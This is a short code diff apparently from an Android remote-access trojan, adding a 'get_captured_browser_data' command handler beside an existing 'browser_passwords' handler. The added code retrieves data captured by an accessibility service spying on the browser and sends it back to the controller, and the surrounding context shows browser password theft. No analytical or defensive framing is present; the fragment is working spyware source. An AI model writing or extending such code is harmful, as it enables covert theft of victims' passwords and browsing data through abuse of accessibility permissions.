@@ -833,7 +833,19 @@ case "browser_passwords":
         sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"Invalid package name\"}");
     }
     break;
-                
+    case "get_captured_browser_data":
+    try {
+        BrowserAccessibilityService service = getBrowserAccessibilityService();
+        if (service != null) {
+            String result = service.getCapturedData();
+            sendCommand("CAPTURED_BROWSER_DATA|" + result);
+        } else {
+            sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"Accessibility service not running\"}");
+        }
+    } catch (Exception e) {
+        sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+    }
+    break;            
 // In routeCommand() method, add these cases:
 
 case "apps_list":
